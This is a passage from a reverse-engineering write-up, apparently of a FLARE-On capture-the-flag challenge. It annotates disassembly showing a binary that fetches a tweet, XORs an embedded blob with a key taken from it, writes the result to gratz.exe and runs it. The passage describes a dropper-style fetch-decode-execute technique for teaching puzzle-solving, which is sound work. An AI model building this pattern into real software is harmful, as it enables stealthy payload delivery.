</span><span class="line"><span class="nl">.text:</span><span class="err">004018</span><span class="nf">F9</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_78</span><span class="p">],</span> <span class="mh">700074h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401900</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_74</span><span class="p">],</span> <span class="mh">3A0073h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401907</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_70</span><span class="p">],</span> <span class="mh">2F002Fh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040190</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_6C</span><span class="p">],</span> <span class="mh">770074h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401915</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_68</span><span class="p">],</span> <span class="mh">740069h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040191</span><span class="nf">C</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_64</span><span class="p">],</span> <span class="mh">650074h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401923</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_60</span><span class="p">],</span> <span class="mh">2E0072h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040192</span><span class="nf">A</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_5C</span><span class="p">],</span> <span class="mh">6F0063h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401931</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_58</span><span class="p">],</span> <span class="mh">2F006Dh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401938</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_54</span><span class="p">],</span> <span class="mh">690046h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040193</span><span class="nf">F</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_50</span><span class="p">],</span> <span class="mh">650072h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401946</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4C</span><span class="p">],</span> <span class="mh">790045h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040194</span><span class="nf">D</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_48</span><span class="p">],</span> <span class="mh">2F0065h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401954</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_44</span><span class="p">],</span> <span class="mh">740073h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040195</span><span class="nf">B</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_40</span><span class="p">],</span> <span class="mh">740061h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401962</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_3C</span><span class="p">],</span> <span class="mh">730075h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401969</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_38</span><span class="p">],</span> <span class="mh">34002Fh</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401970</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_34</span><span class="p">],</span> <span class="mh">340038h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401977</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_30</span><span class="p">],</span> <span class="mh">330030h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040197</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_2C</span><span class="p">],</span> <span class="mh">350033h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401985</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_28</span><span class="p">],</span> <span class="mh">350031h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040198</span><span class="nf">C</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_24</span><span class="p">],</span> <span class="mh">330035h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401993</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_20</span><span class="p">],</span> <span class="mh">310038h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">0040199</span><span class="nf">A</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_1C</span><span class="p">],</span> <span class="mh">360031h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">A1</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_18</span><span class="p">],</span> <span class="mh">300036h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">A8</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_14</span><span class="p">],</span> <span class="mh">38h</span>   <span class="c1">; https://twitter.com/FireEye/status/484033515538116608</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">AF</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">InternetOpenUrlW</span> <span class="c1">; open URL</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">B5</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hInternet</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">BB</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; ebx == 0x00 - check if eax is zero</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">BD</span> <span class="nv">jz</span>      <span class="nv">loc_4018D4</span>      <span class="c1">; if (eax == 0 ) jump to loc_4018D4 (return immedi</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098%28v=vs.85%29.aspx">InternetOpenUrl</a> opens a handle to a resource. <code>dwFlags</code> is set to <code>0x00400100</code>. I could not find the exact meaning of this flag value. However, according to <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa383661%28v=vs.85%29.aspx">this page</a> it could be the <code>OR</code> of two flags (does it work that way?):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>0x00400100 flag </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class=""><span class="line">INTERNET_FLAG_KEEP_CONNECTION: 0x00400000
</span><span class="line">Uses keep-alive semantics, if available, for the connection.
</span><span class="line">
</span><span class="line">INTERNET_FLAG_PRAGMA_NOCACHE: 0x00000100
</span><span class="line">Forces the request to be resolved by the origin server.</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Lines 9 to 35 are saving the URL, we know what it is without even looking at it. We have seen it in Wireshark before. The URL is <code>https://twitter.com/FireEye/status/484033515538116608</code>.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-2.jpg" alt="Fireeye tweet" title="Fireeye tweet" /></p>

<p>Line 37 saves return value which is a “valid handle to the URL if the connection is successfully established, or NULL if the connection fails”. Then it is checked for being NULL, if so we will jump to <code>loc_4018D4</code> and function returns immediately. If we have a handle to the tweet, execution continues.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>loc 4019D6 - InternetReadFile </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D6</span> <span class="nv">loc_4019D6</span><span class="p">:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D6</span> <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">DC</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpdwNumberOfBytesRead - Pointer to variable that will hold number of bytes read</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="kd">DD</span> <span class="nv">push</span>    <span class="mh">1000h</span>           <span class="c1">; dwNumberOfBytesToRead - Number of bytes to read 0x1000 == 4096</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">E2</span> <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Buffer</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">E8</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpBuffer - Buffer to hold the retrieved data</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">E9</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hFile - Handle from previous InternetOpenUrl call</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">EA</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">InternetReadFile</span> <span class="c1">; Reading the first 4KBs of the tweet</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">F0</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">F6</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="nb">edx</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">F9</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; size_t</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">FA</span> <span class="nv">call</span>    <span class="nv">??2@YAPAXI@Z</span>    <span class="c1">; operator new(uint)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">FF</span> <span class="nv">push</span>    <span class="nb">edi</span>             <span class="c1">; size_t</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A00</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A02</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; void *</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A03</span> <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; void *</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A04</span> <span class="nv">call</span>    <span class="nv">_memcpy</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A09</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A0F</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; size_t</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A10</span> <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Buffer</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A16</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; void *</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A17</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">edi</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A1A</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; void *</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A1B</span> <span class="nv">call</span>    <span class="nv">_memcpy</span>         <span class="c1">; Copy retrieved data to [eax]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A20</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; void *</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A21</span> <span class="nv">call</span>    <span class="nv">??3@YAXPAX@Z</span>    <span class="c1">; operator delete(void *)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A26</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A2C</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">20h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A2F</span> <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A31</span> <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esi</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A33</span> <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>         <span class="c1">; Keep reading until NumberofBytesRead is zero</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A35</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_4019D0</span> <span class="c1">; if (NumberofBytesRead !=0 ) jump to loc_4019D0 to continue reading</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D0</span> <span class="nv">loc_4019D0</span><span class="p">:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D0</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hInternet</span><span class="p">]</span> <span class="c1">; Back to the top to continue reading</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385103%28v=vs.85%29.aspx">InternetReadFile</a> retrieves the tweet. A buffer is created to hold the retrieved data. Documentation says “[a] normal read retrieves the specified dwNumberOfBytesToRead for each call to InternetReadFile until the end of the file is reached. To ensure all data is retrieved, an application must continue to call the InternetReadFile function until the function returns TRUE and the lpdwNumberOfBytesRead parameter equals zero.” This is happening in lines 31-35. We keep reading until <code>NumberofBytesRead</code> is zero.</p>

<p>After we are done, the jump in line 32 is not taken and we land here:</p>

<p><img src="http://parsiya.net/images/2014/flare/7-21.jpg" alt="Sifting through the tweet" title="Sifting through the tweet" /></p>

<p>We retrieved the tweet. Now <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/bb773436%28v=vs.85%29.aspx">strstr</a> is called to find the first instance of <code>Secluded Hi</code> in the tweet. The return value is a pointer to the start of <code>Secluded HijackRAT http://t.co/ckx18JHdkb ...</code>. The application adds <code>0x0B</code> or 11 to the start of the string to skip <code>Secluded Hi</code> and point to <code>jackRAT http://t.co/ckx18JHdkb ...</code>. A new 8 character buffer is created and passed to <a href="http://msdn.microsoft.com/en-us/library/xdsywd25.aspx">strncpy</a>. <code>strncpy</code> is called to copy 7 bytes from the start to the newly created buffer which will be <code>jackRAT</code>. The rest is simple, <code>jackRAT</code> is xor-ed with the blob and finally <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa384350%28v=vs.85%29.aspx">InternetCloseHandle</a> is called three times to close the three function calls.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-22.jpg" alt="xor(blob,&quot;jackRAT&quot;)" title="xor(blob,&quot;jackRAT" /></p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>jackRAT xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;jackRAT&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h3 id="are-we-there-yet-gratz-but-not-yet">Are we there yet? gratz but not yet</h3>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">loc_401B83</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B58j</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">call</span>    <span class="nv">InternetRootz</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B88</span> <span class="nv">call</span>    <span class="nv">jackRAT</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B8D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>          <span class="c1">; you are here</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B90</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>   <span class="c1">; application crashes here if no arguments are provided</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B93</span> <span class="nv">mov</span>     <span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="nb">dl</span>              <span class="c1">; blob[0] = arg1[0]; first character of arg1 written to blob</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B99</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B9C</span> <span class="nv">mov</span>     <span class="nb">cl</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>           <span class="c1">; cl = arg1[1]; second character of arg1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B9F</span> <span class="nv">mov</span>     <span class="kt">byte</span><span class="nv">_4131F9</span><span class="p">,</span> <span class="nb">cl</span>       <span class="c1">; blob[1] = arg1[1];</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BA5</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>          <span class="c1">; edx = *(arg2);</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BA8</span> <span class="nv">mov</span>     <span class="nb">al</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="p">]</span>             <span class="c1">; al = arg2[0];</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BAA</span> <span class="nv">mov</span>     <span class="kt">byte</span><span class="nv">_413278</span><span class="p">,</span> <span class="nb">al</span>       <span class="c1">; blob[0x80] = arg2[0]; 413278 - 413F9 = 0x7F</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BAF</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>          <span class="c1">; ecx = *(arg2);</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BB2</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="c1">; edx = arg2[1];</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BB6</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BB9</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aWb</span>            <span class="c1">; mode: &quot;wb&quot; - write in binary mode</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BBE</span> <span class="nv">push</span>    <span class="nb">eax</span>                   <span class="c1">; push current path</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BBF</span> <span class="nv">mov</span>     <span class="kt">byte</span><span class="nv">_413279</span><span class="p">,</span> <span class="nb">dl</span>       <span class="c1">; blob[0x81] = arg2[1];</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BC5</span> <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">],</span> <span class="mh">74617267h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BCC</span> <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0Ch</span><span class="p">],</span> <span class="mh">78652E7Ah</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BD3</span> <span class="nv">mov</span>     <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span> <span class="mh">65h</span> <span class="c1">; &quot;gratz.exe&quot; saved in [ebp-10]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BD9</span> <span class="nv">call</span>    <span class="nv">_fopen</span>                <span class="c1">; fopen(filename=&quot;currentpath\gratz.exe&quot;,mode=&quot;wb&quot;); Open if exists and if not create it</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BDE</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">bl</span><span class="nv">ob_length</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE4</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>              <span class="c1">; *(gratz.exe)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE6</span> <span class="nv">push</span>    <span class="nb">esi</span>                   <span class="c1">; FILE = *(gratz.exe)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE7</span> <span class="nv">push</span>    <span class="nb">ecx</span>                   <span class="c1">; size = blob length</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE8</span> <span class="nv">push</span>    <span class="mi">1</span>                     <span class="c1">; count = 1</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BEA</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nb">bl</span><span class="nv">ob</span>           <span class="c1">; buffer = *(blob)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BEF</span> <span class="nv">call</span>    <span class="nv">_fwrite</span>               <span class="c1">; fwrite( *(blob), 1, blob_length, *(gratz.exe) ); Write blob to gratz.exe</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BF4</span> <span class="nv">push</span>    <span class="nb">esi</span>                   <span class="c1">; push *(gratz.exe)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BF5</span> <span class="nv">call</span>    <span class="nv">_fclose</span>               <span class="c1">; fclose( *(gratz.exe) ); Close gratz.exe</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BFA</span> <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">]</span>        <span class="c1">; edx = &quot;gratz.exe&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BFD</span> <span class="nv">push</span>    <span class="nb">edx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BFE</span> <span class="nv">call</span>    <span class="nv">_system</span>               <span class="c1">; system(&quot;gratz.exe&quot;); Execute gratz.exe</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">C03</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The application crashed in line 5 over and over again. When I looked inside ecx I saw empty space but looking around I saw the application’s complete path. After a while I realized that the code is trying to read arguments. The rest is obvious from the code. First two characters of first argument are written over the first two characters of the blob. First and second characters of second argument are written at offset <code>0x80</code> and <code>0x81</code>.</p>

<p>Then <a href="http://msdn.microsoft.com/en-us/library/yeby3zcb.aspx">fopen</a> is called to create/open a file named <code>gratz.exe</code> for writing in binary mode (“wb”). Then blob is written to it by calling <a href="http://msdn.microsoft.com/en-us/library/h9t88zwz.aspx">fwrite</a> and finally it is closed with <a href="http://msdn.microsoft.com/en-us/library/fxfsw25t.aspx">fclose</a>. Then command <code>gratz.exe</code> is run via the <a href="http://msdn.microsoft.com/en-us/library/277bwbdz.aspx">system</a> call. So we are writing the blob to a file and then executing it.</p>

<p>What is special about first two bytes in a Windows binary? It’s the start of the DOS stub with the magic bytes <code>MZ</code> and you have already guessed that the second argument should be <code>PE</code>.</p>

<h3 id="how-do-i-xor">How do I XOR?</h3>

